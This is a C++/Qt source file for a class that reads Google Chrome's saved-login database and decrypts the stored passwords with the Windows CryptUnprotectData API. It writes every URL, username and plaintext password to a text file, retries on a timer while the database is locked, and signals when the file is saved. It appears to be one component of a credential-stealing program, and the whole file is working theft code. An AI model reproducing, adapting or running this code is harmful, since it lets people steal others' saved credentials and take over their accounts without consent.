#include "chromePass.h"

PassReader::PassReader(QObject* parent, const QString &str):
    QObject(parent),
    path(str),
    timer(nullptr)
{
    setlocale(LC_CTYPE, "rus");

    db = new QSqlDatabase( QSqlDatabase::addDatabase("QSQLITE", "passwords") );

    //Get %appdata% folder
    QString appdata = getenv("APPDATA");
    appdata.replace("\\", "/");

    //Destination folder
    db->setDatabaseName(appdata + "/../Local/Google/Chrome/User Data/Default/Login Data");

    //Create dir ./files/
    QDir fileDir;
    fileDir.mkpath(path + "/files");
}

PassReader::~PassReader()
{
    delete timer;
    delete db;
    QSqlDatabase::removeDatabase("passwords");
}

bool PassReader::readPass()
{
    if ( timer == nullptr )
    {
        timer = new QTimer(this);
    }

    //Output file
    QString filePath = path + "/files/" + "chromePass.txt";
    QFile file(filePath);

    //Open data base
    if (db->open())
    {
        //Create SQL Query, select url+login+pass
        QSqlQuery query("SELECT origin_url, username_value, password_value FROM logins", *db);

        //If data base is locked
        if ( ! query.exec() )
        {
            //TODO: del
            qDebug() << "DB is locked";
            db->close();
            //Start timer
            if ( ! timer->isActive() )
            {
                connect(timer, &QTimer::timeout, this, &PassReader::readPass);
                timer->setInterval(10*1000); //30 sec
                timer->start();
            }
            return false;
        }
        else    //Success
        {
            timer->stop();
            file.open(QIODevice::WriteOnly);
        }

        while (query.next())
        {
            QString url = query.value(0).toString();
            QString user = query.value(1).toString();
            QByteArray pass = query.value(2).toByteArray();
            //Decrypt using Crypt32.lib
            DATA_BLOB DataIn;
            DATA_BLOB DataOut;
            DATA_BLOB* pDataIn = &DataIn;
            DATA_BLOB* pDataOut = &DataOut;

            DataIn.pbData = reinterpret_cast<byte*>( pass.data());  //Pointer to data_input             BYTE*
            DataIn.cbData = pass.size();                            //Size of input string (in bytes)   DWORD

            //Decrypt function
            //https://msdn.microsoft.com/ru-ru/library/windows/desktop/aa380882(v=vs.85).aspx
            if (CryptUnprotectData( pDataIn,
                                    NULL,
                                    NULL,
                                    NULL,
                                    NULL,
                                    0,
                                    pDataOut))
            {
                QByteArray passDecrypted;
                unsigned long passSize  = static_cast<unsigned long>(DataOut.cbData);

                //Get pass string and cut (pbData doesn't have '\0')
                passDecrypted.append(reinterpret_cast<char*>(DataOut.pbData));
                passDecrypted.resize(passSize);

                //Print data
                //qDebug() << endl << url << endl << "user = " << user << "\npass = " << QString(passDecrypted);

                //Stream for writing
                QTextStream stream(&file);
                stream << endl << url << "\r\nuser = " << user << "\r\npass = " << passDecrypted << "\r\n\r\n";
            }
            else
            {
                qDebug() << "Error. Cannot decrypt.";
            }
        }
    }
    else
    {
        qDebug() << "Error. Cannot open DB.";
        file.close();
        emit error();
        return false;
    }

    db->close();
    file.close();
    emit passSaved(filePath);
    return true;
}
